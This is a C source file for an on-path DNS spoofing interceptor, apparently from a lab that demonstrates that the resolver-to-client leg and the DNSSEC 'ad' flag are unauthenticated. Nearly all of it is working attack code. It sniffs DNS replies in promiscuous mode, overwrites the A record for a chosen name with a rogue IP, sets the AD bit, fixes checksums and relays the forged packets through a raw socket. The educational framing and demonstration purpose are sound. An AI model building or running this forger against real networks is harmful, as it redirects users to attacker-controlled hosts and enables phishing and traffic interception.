/*
 * Phase 6 interceptor — on-path response forger for the resolver->client
 * leg (the "last mile"), not the resolver->authoritative leg Phase 2/3/4
 * attacked. Same relay/forge technique as Phase 2's interceptor.c (see
 * that file for the full rationale on the raw IP_HDRINCL send and why no
 * manual L2/ARP handling is needed), relocated to the client subnet and
 * pointed at the opposite direction of traffic:
 *
 *   Phase 2/3/4: core-router diverts AUTHORITATIVE->RESOLVER replies
 *                through an attacker on the resolver subnet.
 *   Phase 6:     edge-router diverts RESOLVER->CLIENT replies through
 *                this attacker on the CLIENT subnet instead.
 *
 * Forging here never touches DNSSEC records at all -- there's nothing
 * upstream of the resolver to attack, by design. This phase's whole point
 * is that the resolver->client leg carries no cryptographic proof of its
 * own: whatever the resolver already validated internally, the client
 * only learns about it through an unauthenticated `ad` flag bit in a
 * plaintext UDP reply. So in addition to the Phase 2-style rdata-only
 * forge, this interceptor explicitly SETS that `ad` flag on every forged
 * response -- not because doing so is technically necessary to fool an
 * ordinary stub (which doesn't check it anyway), but to make concrete,
 * on the wire, the report's point: `ad` is just a bit an on-path attacker
 * can set at will, the same as any other field in an unauthenticated
 * reply, because nothing about it is itself signed or otherwise bound to
 * the data it claims to vouch for.
 *
 * A locally-validating client (this phase's "Client B") is unaffected
 * either way: it isn't taking the resolver's word (the `ad` flag or
 * otherwise) for anything. It re-derives its own answer from the
 * RRSIG/DNSKEY data in the reply against its own trust anchor, so forging
 * the `ad` flag -- or the A record's rdata -- buys nothing against it;
 * the signature simply won't match the altered data, exactly as in
 * Phase 3.
 *
 * Build: gcc -O2 -Wall -o interceptor interceptor.c -lpcap
 * Run:   ./interceptor <iface> <client_ip> <target_fqdn> <rogue_ip> <toggle_file>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>

#define ETH_ALEN 6
#define ETHERTYPE_IP 0x0800
#define DNS_AD_BIT 0x0020

#pragma pack(push, 1)
struct eth_hdr {
    uint8_t  dst[ETH_ALEN];
    uint8_t  src[ETH_ALEN];
    uint16_t ethertype;
};
struct ip_hdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
};
struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t checksum;
};
struct dns_hdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

static int raw_sock = -1;          /* IP_HDRINCL raw socket for sending */
static struct sockaddr_in client_addr;

static pcap_t *handle = NULL;
static pcap_dumper_t *dumper = NULL;
static uint8_t my_mac[ETH_ALEN];
static char target_fqdn[256];
static uint32_t rogue_ip_net; /* network byte order */
static char toggle_file[512];
static long packets_seen = 0;
static long packets_relayed = 0;
static long packets_forged = 0;

/* ---- helpers ---------------------------------------------------------- */

static uint16_t checksum16(const void *data, size_t len, uint32_t sum) {
    const uint16_t *p = data;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static int forging_enabled(void) {
    FILE *f = fopen(toggle_file, "r");
    if (!f) return 0;
    int c = fgetc(f);
    fclose(f);
    return c == '1';
}

/* Same simplified name parser as Phase 2/3/4's interceptor.c: one
 * compression-pointer hop, sufficient for every response this lab's BIND
 * instances produce. */
static int parse_name(const uint8_t *buf, int buf_len, int off, char *out, int outsz) {
    int start = off, o = 0, jumped = 0, guard = 0;
    while (off < buf_len && guard++ < 64) {
        uint8_t len = buf[off];
        if (len == 0) { off++; break; }
        if ((len & 0xC0) == 0xC0) {
            if (off + 1 >= buf_len) break;
            int ptr = ((len & 0x3F) << 8) | buf[off + 1];
            if (!jumped) start = off + 2;
            off = ptr;
            jumped = 1;
            continue;
        }
        off++;
        if (off + len > buf_len) break;
        if (o + len + 1 < outsz) {
            memcpy(out + o, buf + off, len);
            o += len;
            out[o++] = '.';
        }
        off += len;
    }
    if (o < outsz) out[o] = '\0'; else out[outsz - 1] = '\0';
    return jumped ? start : off;
}

static void get_own_mac(const char *iface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        exit(1);
    }
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    close(sock);
    fprintf(stderr, "own MAC on %s: %02x:%02x:%02x:%02x:%02x:%02x\n", iface,
            my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
}

/* ---- main packet handler ---------------------------------------------- */

static void handle_packet(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
    (void)user;
    static uint8_t buf[65536];
    if (h->caplen < sizeof(struct eth_hdr) || h->caplen > sizeof(buf)) return;
    memcpy(buf, bytes, h->caplen);
    int caplen = (int)h->caplen;

    struct eth_hdr *eth = (struct eth_hdr *)buf;
    if (ntohs(eth->ethertype) != ETHERTYPE_IP) return;

    int ip_off = sizeof(struct eth_hdr);
    if (caplen < ip_off + (int)sizeof(struct ip_hdr)) return;
    struct ip_hdr *ip = (struct ip_hdr *)(buf + ip_off);
    int ihl = (ip->ver_ihl & 0x0F) * 4;
    if (ip->protocol != 17) return; /* UDP only */

    int udp_off = ip_off + ihl;
    if (caplen < udp_off + (int)sizeof(struct udp_hdr)) return;
    struct udp_hdr *udp = (struct udp_hdr *)(buf + udp_off);

    int dns_off = udp_off + sizeof(struct udp_hdr);
    int dns_len = caplen - dns_off;
    if (dns_len < (int)sizeof(struct dns_hdr)) return;
    struct dns_hdr *dns = (struct dns_hdr *)(buf + dns_off);

    packets_seen++;

    uint16_t flags = ntohs(dns->flags);
    int qr = (flags >> 15) & 1;
    uint16_t qdcount = ntohs(dns->qdcount);
    uint16_t ancount = ntohs(dns->ancount);

    char sbuf[INET_ADDRSTRLEN], dbuf[INET_ADDRSTRLEN];
    struct in_addr sa, da;
    sa.s_addr = ip->src_ip;
    da.s_addr = ip->dst_ip;
    strncpy(sbuf, inet_ntoa(sa), sizeof(sbuf));
    strncpy(dbuf, inet_ntoa(da), sizeof(dbuf));

    int did_forge = 0;
    if (qr == 1 && qdcount >= 1 && ancount >= 1 && forging_enabled()) {
        char qname[256];
        int off = dns_off + sizeof(struct dns_hdr);
        off = parse_name(buf, caplen, off, qname, sizeof(qname));
        off += 4; /* qtype + qclass */

        if (strcasecmp(qname, target_fqdn) == 0) {
            char aname[256];
            int aoff = parse_name(buf, caplen, off, aname, sizeof(aname));
            if (aoff + 10 <= caplen) {
                uint16_t atype;
                memcpy(&atype, buf + aoff, 2);
                atype = ntohs(atype);
                uint16_t rdlength;
                memcpy(&rdlength, buf + aoff + 8, 2);
                rdlength = ntohs(rdlength);
                int rdata_off = aoff + 10;
                if (atype == 1 && rdlength == 4 && rdata_off + 4 <= caplen) {
                    memcpy(buf + rdata_off, &rogue_ip_net, 4);
                    did_forge = 1;
                    packets_forged++;

                    /* Set the AD bit on the forged reply -- see this
                     * file's header comment. Purely cosmetic against an
                     * ordinary stub (which never looks at it), but makes
                     * concrete that the bit is attacker-settable: nothing
                     * about it is bound to the data it claims to vouch
                     * for. */
                    flags |= DNS_AD_BIT;
                    dns->flags = htons(flags);
                }
            }
        }
    }

    /* Recompute the UDP checksum unconditionally for every packet we
     * relay, forged or not -- see Phase 2/3/4's interceptor.c for why. */
    {
        udp->checksum = 0;
        int udp_len = ntohs(udp->len);
        uint32_t pseudo_sum = 0;
        pseudo_sum += (ip->src_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->src_ip & 0xFFFF;
        pseudo_sum += (ip->dst_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->dst_ip & 0xFFFF;
        pseudo_sum += htons(17);
        pseudo_sum += htons((uint16_t)udp_len);
        udp->checksum = checksum16(udp, udp_len, pseudo_sum);
    }

    if (dumper) {
        struct pcap_pkthdr dh = *h;
        dh.caplen = dh.len = caplen;
        pcap_dump((u_char *)dumper, &dh, buf);
    }

    /* Relay via a raw IP_HDRINCL socket to the client -- same mechanism
     * as Phase 2/3/4, just a different destination. */
    {
        int ip_total_len = ntohs(ip->tot_len);
        if (ip_total_len <= caplen - ip_off) {
            ssize_t sent = sendto(raw_sock, buf + ip_off, ip_total_len, 0,
                                   (struct sockaddr *)&client_addr, sizeof(client_addr));
            if (sent < 0) {
                perror("sendto");
            } else {
                packets_relayed++;
            }
        }
    }

    fprintf(stderr, "[%s] %s:%u -> %s:%u qr=%d qd=%u an=%u  (seen=%ld relayed=%ld forged=%ld)\n",
            did_forge ? "FORGE+AD" : "relay",
            sbuf, ntohs(udp->sport), dbuf, ntohs(udp->dport),
            qr, qdcount, ancount, packets_seen, packets_relayed, packets_forged);
}

int main(int argc, char **argv) {
    if (argc != 6) {
        fprintf(stderr,
            "usage: %s <iface> <client_ip> <target_fqdn> <rogue_ip> <toggle_file>\n",
            argv[0]);
        return 1;
    }
    const char *iface     = argv[1];
    const char *client_ip = argv[2]; /* kept for logging/clarity only now */
    strncpy(target_fqdn, argv[3], sizeof(target_fqdn) - 1);
    const char *rogue_ip  = argv[4];
    strncpy(toggle_file, argv[5], sizeof(toggle_file) - 1);

    struct in_addr a;
    if (inet_pton(AF_INET, rogue_ip, &a) != 1) {
        fprintf(stderr, "bad rogue ip\n");
        return 1;
    }
    rogue_ip_net = a.s_addr;

    get_own_mac(iface);

    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("socket(SOCK_RAW, IPPROTO_RAW)");
        return 1;
    }
    int on = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL");
        return 1;
    }
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, client_ip, &client_addr.sin_addr) != 1) {
        fprintf(stderr, "bad client ip\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(iface, 65536, 1 /*promisc*/, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_setdirection(handle, PCAP_D_IN) < 0) {
        fprintf(stderr, "pcap_setdirection warning: %s\n", pcap_geterr(handle));
    }

    dumper = pcap_dump_open(handle, "/tmp/injected.pcap");
    if (!dumper) fprintf(stderr, "pcap_dump_open failed: %s\n", pcap_geterr(handle));

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp and port 53", 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        fprintf(stderr, "bpf filter error: %s\n", pcap_geterr(handle));
        return 1;
    }

    fprintf(stderr,
        "interceptor up on %s, client=%s (relayed via raw IP_HDRINCL socket), "
        "target=%s rogue=%s, toggle=%s\n",
        iface, client_ip, target_fqdn, rogue_ip, toggle_file);

    pcap_loop(handle, -1, handle_packet, NULL);

    if (dumper) pcap_dump_close(dumper);
    pcap_close(handle);
    return 0;
}
